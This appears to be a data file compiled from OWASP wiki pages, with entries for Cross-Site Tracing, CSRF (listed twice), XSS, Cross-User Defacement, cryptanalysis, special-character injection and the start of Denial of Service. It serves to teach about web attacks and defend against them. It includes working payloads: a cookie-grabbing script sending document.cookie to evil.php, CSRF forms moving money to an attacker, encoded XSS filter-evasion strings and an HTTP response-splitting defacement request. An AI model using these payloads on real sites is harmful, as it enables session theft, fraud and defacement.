# If the value of history.length remains the same, then your search has no results

By repeating the above attack and trying different values of the salary parameters, an attacker can gather very sensitive salary information of any employee. This is a very serious Cross-Site information leakage. If an application has a functionality like a search page with conditional redirect, then this application is vulnerable to '''XSHM''' and essentially it is a similar to a direct exposure to [[media:OWASP_IL_The_Universal_XSS_PDF_Vulnerability.pdf|Universal XSS]] – the application itself is [[Cross-site Scripting (XSS)|XSS]]-safe, but running it from a different site inside an IFRAME makes it vulnerable.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Cross Site Tracing</name>
    <description>A '''Cross-Site Tracing (XST)''' attack involves the use of [[Cross-site Scripting (XSS)]] and the TRACE or TRACK HTTP methods. According to [http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html RFC 2616], "TRACE allows the client to see what is being received at the other end of the request chain and use that data for testing or diagnostic information.", the TRACK method works in the same way but is specific to Microsoft's IIS web server. XST could be used as a method to steal user's cookies via [[Cross-site Scripting (XSS)]] even if the cookie has the  "[[HttpOnly]]" flag set and/or expose the user's Authorization header.

The TRACE method, while apparently harmless, can be successfully leveraged in some scenarios to steal legitimate users' credentials. This attack technique was discovered by Jeremiah Grossman in 2003, in an attempt to bypass the [[HttpOnly]] tag that Microsoft introduced in Internet Explorer 6 sp1 to protect cookies from being accessed by JavaScript. As a matter of fact, one of the most recurring attack patterns in Cross Site Scripting is to access the document.cookie object and send it to a web server controlled by the attacker so that he/she can hijack the victim's session. Tagging a cookie as [[HttpOnly]] forbids JavaScript to access it, protecting it from being sent to a third party. However, the TRACE method can be used to bypass this protection and access the cookie even in this scenario.

Modern browsers now prevent TRACE requests being made via JavaScript, however, other ways of sending TRACE requests with browsers have been discovered, such as using Java.
</description>
    <environment />
    <example>An example using cURL from the command line to send a TRACE request to a web server on the localhost with TRACE enabled. Notice how the web server responds with the request that was sent to it.

&lt;pre&gt;
$ curl -X TRACE 127.0.0.1
TRACE / HTTP/1.1
User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5
Host: 127.0.0.1
Accept: */*
&lt;/pre&gt;

In this example notice how we send a Cookie header with the request and it is also in the web server's response.

&lt;pre&gt;
$ curl -X TRACE -H "Cookie: name=value" 127.0.0.1
TRACE / HTTP/1.1
User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5
Host: 127.0.0.1
Accept: */*
Cookie: name=value
&lt;/pre&gt;

In this example the TRACE method is disabled, notice how we get an error instead of the request we sent.

&lt;pre&gt;
$ curl -X TRACE 127.0.0.1
&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;405 Method Not Allowed&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Method Not Allowed&lt;/h1&gt;
&lt;p&gt;The requested method TRACE is not allowed for the URL /.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;/pre&gt;

Example JavaScript XMLHttpRequest TRACE request. In Firefox 19.0.2 it will not work and return a "Illegal Value" error. In Google Chrome 25.0.1364.172 it will not work and return a "Uncaught Error: SecurityError: DOM Exception 18" error. This is because modern browsers now block the TRACE method in XMLHttpRequest to help mitigate XST.

&lt;pre&gt;
&lt;script&gt;
  var xmlhttp = new XMLHttpRequest();
  var url = 'http://127.0.0.1/';

  xmlhttp.withCredentials = true; // send cookie header
  xmlhttp.open('TRACE', url, false);
  xmlhttp.send();
&lt;/script&gt;
&lt;/pre&gt;

== Remediation ==

===Apache===
In Apache versions 1.3.34, 2.0.55 and later, set the TraceEnable directive to "off" in the main configuration file and then restart Apache. See [http://httpd.apache.org/docs/2.2/mod/core.html#traceenable TraceEnable] for further information.

&lt;pre&gt;
TraceEnable off
&lt;/pre&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>	Cross-Site Request Forgery (CSRF)					</name>
    <description>CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. A successful CSRF  exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.

Cross-Site Request Forgery (CSRF) is an attack that tricks the victim into loading a page that contains a malicious request. It is malicious in the sense that it inherits the identity and privileges of the victim to perform an undesired function on the victim's behalf, like change the victim's e-mail address, home address, or password, or purchase something. CSRF attacks generally target functions that cause a state change on the server but can also be used to access sensitive data.

For most sites, browsers will automatically include with such requests any credentials associated with the site, such as the user's session cookie, basic auth credentials, IP address, Windows domain credentials, etc.  Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish this from a legitimate user request.

In this way, the attacker can make the victim perform actions that they didn't intend to, such as logout, purchase item, change account information, retrieve account information, or any other function provided by the vulnerable website.

Sometimes, it is possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called Stored CSRF flaws. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet.  The likelihood is also increased because the victim is sure to be authenticated to the site already.

Synonyms: CSRF attacks are also known by a number of other names, including XSRF, "Sea Surf", Session Riding, Cross-Site Reference Forgery, Hostile Linking. Microsoft refers to this type of attack as a One-Click attack in their threat modeling process and many places in their online documentation.</description>
    <environment />
    <example>===How does the attack work?===
There are numerous ways in which an end-user can be tricked into loading information from or submitting information to a web application. In order to execute an attack, we must first understand how to generate a malicious request for our victim to execute. Let us consider the following example: Alice wishes to transfer $100 to Bob using ''bank.com'' web application that is vulnerable to CSRF. Maria, an attacker, wants to trick Alice to send the money to her instead. The attack will comprise of the following steps:

* building an exploit URL or script,
* tricking Alice into executing it with [[Social Engineering]]

====GET scenario====
If the application was designed to primarily use GET requrests to transfer parameters and execute actions, the money transfer operation might be reduced to such request:

 GET &lt;nowiki&gt;http://bank.com/transfer.do?acct=BOB&amp;amount=100&lt;/nowiki&gt; HTTP/1.1

Maria now decides to exploit this web application vulnerability using Alice as her victim. Maria first constructs the following exploit URL which will transfer $100,000 from Alice's account to her account. She takes the original command URL and replaces the beneficiary name with herself, raising the transfer amount significantly at the same time:

 &lt;nowiki&gt;http://bank.com/transfer.do?acct=MARIA&amp;amount=100000&lt;/nowiki&gt;

The [[Social Engineering]] part of the attack will be now to trick Alice to load this URL when she's logged into the bank. This is usually done with one of the following techniques:

* sending an unsolicited email with HTML content
* planting exploit URL or script on pages that are likely to be visited by the victim.

The exploit URL can be disguised either as ordinary link, encouraging the victim to click it:

 &lt;nowiki&gt;&lt;a href="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"&gt;View my Pictures!&lt;/a&gt;&lt;/nowiki&gt;

Or by a 1x1 fake image:

 &lt;nowiki&gt;&lt;img src="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000" width="1" height="1" border="0"&gt;&lt;/nowiki&gt;

If this image tag were included in the email, Alice would only see a little box indicating that the browser could not render the image. However, the browser ''will still'' submit the request to bank.com without any visual indication that the transfer has taken place.

A real life example of CSRF attack on application using GET was [http://xs-sniper.com/blog/2008/04/21/csrf-pwns-your-box/ uTorrent exploit] from 2008 that was used on mass scale to download malware.

====POST scenario====
The only difference when POST requests are being is how the attack is being executed by the victim. Let's assume the bank now uses POST and the vulnerable request looks like this:

 POST &lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt; HTTP/1.1
 
 acct=BOB&amp;amount=100

Such request  cannot be delivered using standard A or IMG tags, but can be delivered using FORM tag:

 &lt;form action="&lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt;" method="POST"&gt;
 &lt;input type="hidden" name="acct" value="MARIA"/&gt;
 &lt;input type="hidden" name=amount" value="100000"/&gt;
 &lt;input type="submit" value="View my pictures"/&gt;
 &lt;/form&gt;

This form will require user clicking the submit button, but this can be also executed automatically using JavaScript:

 &lt;body onload="document.forms[0].submit()"&gt;
 &lt;form...
 
====Other HTTP methods====
Modern web application APIs are frequently using other HTTP methods such as PUT or DELETE. Let's assume the vulnerable bank uses PUT method that takes JSON block as an argument:

 PUT &lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt; HTTP/1.1
 
 {"acct":"BOB", "amount":100}

Such requests can be executed with JavaScript embedded into an exploit page:

 &lt;script&gt;
 function put() {
 	var x = new XMLHttpRequest();
 	x.open("PUT","&lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt;",true);
 	x.setRequestHeader("Content-Type", "application/json"); 
 	x.send(JSON.stringify('{"acct":"BOB", "amount":100}')); 
 }
 &lt;/script&gt;
 &lt;body onload="put()"&gt;

Fortunately, this request will be '''not''' executed by modern web browsers thanks to [[Same-Origin Policy]] restrictions. This restriction will be however enabled only if the target web site does not explicitly open up their [[HTML5 Security Cheat Sheet#Cross_Origin_Resource_Sharing|CORS]] with the following header:

 Access-Control-Allow-Origin: *</example>
    <determination>See the [http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet OWASP CSRF Prevention Cheat Sheet] for prevention measures.

Listen to the [http://www.owasp.org/download/jmanico/owasp_podcast_69.mp3 OWASP Top Ten CSRF Podcast].

Most frameworks have built-in CSRF support such as [http://docs.joomla.org/How_to_add_CSRF_anti-spoofing_to_forms Joomla], [http://blog.eyallupu.com/2012/04/csrf-defense-in-spring-mvc-31.html Spring], [http://web.securityinnovation.com/appsec-weekly/blog/bid/84318/Cross-Site-Request-Forgery-CSRF-Prevention-Using-Struts-2 Struts], [http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf Ruby on Rails], [http://www.troyhunt.com/2010/11/owasp-top-10-for-net-developers-part-5.html .NET] and others. 

John Melton also has an [http://www.jtmelton.com/2010/05/16/the-owasp-top-ten-and-esapi-part-6-cross-site-request-forgery-csrf/ excellent blog post] describing how to use the native anti-CSRF functionality of the [http://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API OWASP ESAPI].</determination>
    <protection />
  </vul>
  <vul>
    <name>Cross-site Scripting (XSS)</name>
    <description>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws.

Cross-Site Scripting (XSS) attacks occur when:

# Data enters a Web application through an untrusted source, most frequently a web request. 
# The data is included in dynamic content that is sent to a web user without being validated for malicious content. 

The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.</description>
    <environment />
    <example>Cross-site scripting attacks may occur anywhere that possibly malicious users are allowed to post unregulated material to a trusted web site for the consumption of other valid users.

The most common example can be found in bulletin-board web sites which provide web based mailing list-style functionality. 

===Example 1=== 

The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.

&lt;pre&gt;
	&lt;% String eid = request.getParameter("eid"); %&gt; 
	...
	Employee ID: &lt;%= eid %&gt;
&lt;/pre&gt;

The code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.

Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.

===Example 2===

The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.

&lt;pre&gt; 
	&lt;%... 
	 Statement stmt = conn.createStatement();
	 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
	 if (rs != null) {
	  rs.next(); 
	  String name = rs.getString("name");
	%&gt;
	
	Employee Name: &lt;%= name %&gt;
&lt;/pre&gt;

As in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Stored XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:

* As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. 
* As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. 
* A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. 

=== Attack Examples ===

'''Example 1 : Cookie Grabber'''

If the application doesn't validate the input data, the attacker can easily steal a cookie from an authenticated user. All the attacker has to do is to place the following code in any posted input(ie: message boards, private messages, user profiles):

&lt;pre&gt;
&lt;SCRIPT type="text/javascript"&gt;
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
&lt;/SCRIPT&gt;
&lt;/pre&gt;

The above code will pass an escaped content of the cookie (according to RFC content must be escaped before sending it via HTTP protocol with GET method) to the evil.php script in "cakemonster" variable. The attacker then checks the results of his evil.php script (a cookie grabber script will usually write the cookie to a file) and use it.

===Error Page Example===

Let's assume that we have an error page, which is handling requests for a non existing pages, a classic 404 error
page. We may use the code below as an example to inform user about what specific page is missing:
&lt;pre&gt;
&lt;html&gt;
&lt;body&gt;

&lt;? php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?&gt;

&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;
Let's see how it works:
&lt;pre&gt;
http://testsite.test/file_which_not_exist
&lt;/pre&gt;
In response we get:
&lt;pre&gt;
Not found: /file_which_not_exist
&lt;/pre&gt;
Now we will try to force the error page to include our code:
&lt;pre&gt;
http://testsite.test/&lt;script&gt;alert("TEST");&lt;/script&gt;
&lt;/pre&gt;
The result is:
&lt;pre&gt;
Not found: / (but with JavaScript code &lt;script&gt;alert("TEST");&lt;/script&gt;)
&lt;/pre&gt;
We have successfully injected the code, our XSS! What does it mean? For example, that we
may use this flaw to try to steal a user's session cookie.
</example>
    <determination>XSS flaws can be difficult to identify and remove from a web application. The best way to find flaws is to perform a security review of the code and search for all places where input from an HTTP request could possibly make its way into the HTML output. Note that a variety of different HTML tags can be used to transmit a malicious JavaScript. Nessus, Nikto, and some other available tools can help scan a website for these flaws, but can only scratch the surface. If one part of a website is vulnerable, there is a high likelihood that there are other problems as well.</determination>
    <protection>The primary defenses against XSS are described in the [[XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet |OWASP XSS Prevention Cheat Sheet]].

Also, it's crucial that you turn off HTTP TRACE support on all webservers. An attacker can steal cookie data via Javascript even when document.cookie is disabled or not supported on the client. This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the user's cookie information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack. This is easily mitigated by removing support for HTTP TRACE on all webservers.

The [[ESAPI |OWASP ESAPI project]] has produced a set of reusable security components in several languages, including validation and escaping routines to prevent parameter tampering and the injection of XSS attacks. In addition, the [[:Category:OWASP WebGoat Project|OWASP WebGoat Project]] training application has lessons on Cross-Site Scripting and data encoding.

===Alternate XSS Syntax===
====XSS using Script in Attributes====

XSS attacks may be conducted without using &lt;script&gt;&lt;/script&gt; tags.
Other tags will do exactly the same thing, for example:
&lt;pre&gt;
&lt;body onload=alert('test1')&gt;
&lt;/pre&gt;
or other attributes like: onmouseover, onerror.

onmouseover
&lt;pre&gt;
&lt;b onmouseover=alert('Wufff!')&gt;click me!&lt;/b&gt;
&lt;/prE&gt;
onerror
&lt;pre&gt;
&lt;img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);&gt;
&lt;/pre&gt;

====XSS using Script Via Encoded URI Schemes====

If we need to hide against web application filters we may try to encode string characters, e.g.: a=&amp;#X41 (UTF-8) and use it in
IMG tag:
&lt;pre&gt;
&lt;IMG SRC=j&amp;#X41vascript:alert('test2')&gt;
&lt;/pre&gt;
There are many different UTF-8 encoding notations what give us even more possibilities.

====XSS using code encoding====

We may encode our script in base64 and place it in META tag. This way we get rid of alert() totally. More information about this method can be found in RFC 2397
&lt;pre&gt;
&lt;META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"&gt;
&lt;/pre&gt;
These and others examples can be found at the OWASP [[XSS Filter Evasion Cheat Sheet]] which is a true encyclopedia of the alternate XSS syntax attack.</protection>
  </vul>
  <vul>
    <name>Cross-User Defacement</name>
    <description>An attacker can make a single request to a vulnerable server that will cause the sever to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the sever. This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.

This attack is rather difficult to carry out in the real environment. The list of conditions is long and hard to
accomplish by the attacker.

Cross-User Defacement attack is possible because of [[HTTP Response Splitting]] and flaws in the web application.
It is crucial from the attacker's point of view that the application allows for filling the header field with
more than one header using CR (Carrige Return) and LF (Line Feed) characters.</description>
    <environment />
    <example>We have found a web page, which gets service name from the "page" argument and then redirects (302)
to this service.

Example:
http://testsite.com/redir.php?page=http://other.testsite.com/

And exemplary code of the redir.php:
&lt;pre&gt;
rezos@spin ~/public_html $ cat redir.php
&lt;?php
header ("Location: " . $_GET['page']);
?&gt;
&lt;/pre&gt;
Crafting appropriate requests:
&lt;pre&gt;
/redir.php?page=http://other.testsite.com%0d%0aContent-
Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-
Type:%20text/html%0d%0aContent-
Length:%2019%0d%0a%0d%0a&lt;html&gt;deface&lt;/html&gt;
&lt;/pre&gt;
HTTP server will respond with two (not one!) following headers:

1
&lt;pre&gt;
HTTP/1.1 302 Moved Temporarily
Date: Wed, 24 Dec 2003 15:26:41 GMT
Location: http://testsite.com/redir.php?page=http://other.testsite.com
Content-Length: 0
&lt;/pre&gt;
2
&lt;pre&gt;
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 19
&lt;html&gt;deface&lt;/html&gt;
&lt;/pre&gt;
If user shares a TCP connection (e.g. proxy cache) and will send a request:

/index.html

the response #2 will be send to him as an answer to his request.

This way it was possible to replace the web page, which was served to the specified user.


More information can be found in one of the presentations under
http://www.owasp.org/images/1/1a/OWASPAppSecEU2006_HTTPMessageSplittingSmugglingEtc.ppt</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Cryptanalysis</name>
    <description>Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction).  Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful.  An attacker may have other goals as well, such as:  
* Total Break - Finding the secret key.
* Gobal Deduction - Finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key.
* Information Deduction - Gaining some information about plaintexts or ciphertexts that was not previously known.
* Distinguishing Algorithm - The attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits.
    
The goal of the attacker performing cryptanalysis will depend on the specific needs of the attacker in a given attack context.  In most cases, if cryptanalysis is successful at all, an attacker will not be able to go past being able to deduce some information about the plaintext (goal 3).  However, that may be sufficient for an attacker, depending on the context.</description>
    <environment />
    <example>A very easy to understand (but totally inapplicable to modern cryptographic ciphers) example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed monoalphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet.  This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position.  While monoalphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper.  Frequency analysis cryptanalysis uses the fact that natural language is not random and monoalphabetic substitution does not hide the statistical properties of the natural language.  So if the letter "E" in an English language occurs with a certain known frequency (about 12.7%), whatever "E" was substituted with to get to the ciphertext, will occur with the similar frequency.  Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext.  Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm).  This example is just here to illustrate a rudimentary example of cryptanalysis.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Cross-Site Request Forgery (CSRF)</name>
    <description>CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. A successful CSRF  exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.

Cross-Site Request Forgery (CSRF) is an attack that tricks the victim into loading a page that contains a malicious request. It is malicious in the sense that it inherits the identity and privileges of the victim to perform an undesired function on the victim's behalf, like change the victim's e-mail address, home address, or password, or purchase something. CSRF attacks generally target functions that cause a state change on the server but can also be used to access sensitive data.

For most sites, browsers will automatically include with such requests any credentials associated with the site, such as the user's session cookie, basic auth credentials, IP address, Windows domain credentials, etc.  Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish this from a legitimate user request.

In this way, the attacker can make the victim perform actions that they didn't intend to, such as logout, purchase item, change account information, retrieve account information, or any other function provided by the vulnerable website.

Sometimes, it is possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called Stored CSRF flaws. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet.  The likelihood is also increased because the victim is sure to be authenticated to the site already.

Synonyms: CSRF attacks are also known by a number of other names, including XSRF, "Sea Surf", Session Riding, Cross-Site Reference Forgery, Hostile Linking. Microsoft refers to this type of attack as a One-Click attack in their threat modeling process and many places in their online documentation.

===Prevention measures that do '''NOT''' work===
;Using a secret cookie
:Remember that all cookies, even the ''secret'' ones, will be submitted with every request. All authentication tokens will be submitted regardless of whether or not the end-user was tricked into submitting the request. Furthermore, session identifiers are simply used by the application container to associate the request with a specific session object. The session identifier does not verify that the end-user intended to submit the request.

;Only accepting POST requests
:Applications can be developed to only accept POST requests for the execution of business logic. The misconception is that since the attacker cannot construct a malicious link, a CSRF attack cannot be executed. Unfortunately, this logic is incorrect. There are numerous methods in which an attacker can trick a victim into submitting a forged POST request, such as a simple form hosted in attacker's website with hidden values. This form can be triggered automatically by JavaScript or can be triggered by the victim who thinks form will do something else.</description>
    <environment />
    <example>===How does the attack work?===
There are numerous ways in which an end-user can be tricked into loading information from or submitting information to a web application. In order to execute an attack, we must first understand how to generate a malicious request for our victim to execute. Let us consider the following example: Alice wishes to transfer $100 to Bob using ''bank.com'' web application that is vulnerable to CSRF. Maria, an attacker, wants to trick Alice to send the money to her instead. The attack will comprise of the following steps:

* building an exploit URL or script,
* tricking Alice into executing it with [[Social Engineering]]

====GET scenario====
If the application was designed to primarily use GET requrests to transfer parameters and execute actions, the money transfer operation might be reduced to such request:

 GET &lt;nowiki&gt;http://bank.com/transfer.do?acct=BOB&amp;amount=100&lt;/nowiki&gt; HTTP/1.1

Maria now decides to exploit this web application vulnerability using Alice as her victim. Maria first constructs the following exploit URL which will transfer $100,000 from Alice's account to her account. She takes the original command URL and replaces the beneficiary name with herself, raising the transfer amount significantly at the same time:

 &lt;nowiki&gt;http://bank.com/transfer.do?acct=MARIA&amp;amount=100000&lt;/nowiki&gt;

The [[Social Engineering]] part of the attack will be now to trick Alice to load this URL when she's logged into the bank. This is usually done with one of the following techniques:

* sending an unsolicited email with HTML content
* planting exploit URL or script on pages that are likely to be visited by the victim.

The exploit URL can be disguised either as ordinary link, encouraging the victim to click it:

 &lt;nowiki&gt;&lt;a href="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"&gt;View my Pictures!&lt;/a&gt;&lt;/nowiki&gt;

Or by a 1x1 fake image:

 &lt;nowiki&gt;&lt;img src="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000" width="1" height="1" border="0"&gt;&lt;/nowiki&gt;

If this image tag were included in the email, Alice would only see a little box indicating that the browser could not render the image. However, the browser ''will still'' submit the request to bank.com without any visual indication that the transfer has taken place.

A real life example of CSRF attack on application using GET was [http://xs-sniper.com/blog/2008/04/21/csrf-pwns-your-box/ uTorrent exploit] from 2008 that was used on mass scale to download malware.

====POST scenario====
The only difference when POST requests are being is how the attack is being executed by the victim. Let's assume the bank now uses POST and the vulnerable request looks like this:

 POST &lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt; HTTP/1.1
 
 acct=BOB&amp;amount=100

Such request  cannot be delivered using standard A or IMG tags, but can be delivered using FORM tag:

 &lt;form action="&lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt;" method="POST"&gt;
 &lt;input type="hidden" name="acct" value="MARIA"/&gt;
 &lt;input type="hidden" name=amount" value="100000"/&gt;
 &lt;input type="submit" value="View my pictures"/&gt;
 &lt;/form&gt;

This form will require user clicking the submit button, but this can be also executed automatically using JavaScript:

 &lt;body onload="document.forms[0].submit()"&gt;
 &lt;form...
 
====Other HTTP methods====
Modern web application APIs are frequently using other HTTP methods such as PUT or DELETE. Let's assume the vulnerable bank uses PUT method that takes JSON block as an argument:

 PUT &lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt; HTTP/1.1
 
 {"acct":"BOB", "amount":100}

Such requests can be executed with JavaScript embedded into an exploit page:

 &lt;script&gt;
 function put() {
 	var x = new XMLHttpRequest();
 	x.open("PUT","&lt;nowiki&gt;http://bank.com/transfer.do&lt;/nowiki&gt;",true);
 	x.setRequestHeader("Content-Type", "application/json"); 
 	x.send(JSON.stringify('{"acct":"BOB", "amount":100}')); 
 }
 &lt;/script&gt;
 &lt;body onload="put()"&gt;

Fortunately, this request will be '''not''' executed by modern web browsers thanks to [[Same-Origin Policy]] restrictions. This restriction will be however enabled only if the target web site does not explicitly open up their [[HTML5 Security Cheat Sheet#Cross_Origin_Resource_Sharing|CORS]] with the following header:

 Access-Control-Allow-Origin: *</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Custom Special Character Injection</name>
    <description>The software does not properly filter or quote special characters or reserved words that are used in a custom or proprietary language or representation that is used by the product. That allows attackers to modify the syntax, content, or commands before they are processed by the end system.</description>
    <environment />
    <example>'''Example1'''

A simple example is an application which executes almost everything which is passed to it from the current terminal by the user without
sanitazing and blocking user input. If the application doesn't implement appropriate signals handling, we may interrupt or suspend program
execution by sending respectively ''Ctrl+C (^C)'' or ''Ctrl+Z (^Z)'' combinations. These combinations are sending signals to the application.
In the first case it's ''SIGINT'' and in the second it's ''SIGSTOP'' signal.

'''Example2'''

The classic example, often used by the IRC warriors/bandits, was disconnecting modem users by sending to them a special sequence of
characters. Sending via any protocol (IP) "''+++ATH0''" sequence caused some modems to interpret this sequence as a disconnect command. So
all that had to be done was to send the sequence on an IRC channel, which in effect forced vulnerable modems to disconnect.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Denial of Service</name>
    <description>The Denial of Service (DoS) attack is focused on making unavailable a resource (site, application, server) for the purpose it was designed. There are many ways to make a service unavailable for legitimate users by manipulating network packets, programming, logical, or resources handling vulnerabilities, among others.
If a service receives a very large number of requests, it may stop providing service to legitimate users. In the same way, a service may stop if a programming vulnerability is exploited, or the way the service handles resources used by it.

Sometimes the attacker can inject and execute arbitrary code while performing a DoS attack in order to access critical information or execute commands on the server.
Denial-of-service attacks significantly degrade service quality experienced by legitimate users. It introduces large response delays, excessive losses, and service interruptions, resulting in direct impact on availability.</description>
    <environment />
    <example>The following DoS techniques and examples were extracted from OWASP Testing Guide v2.

===DoS User Specified Object Allocation===

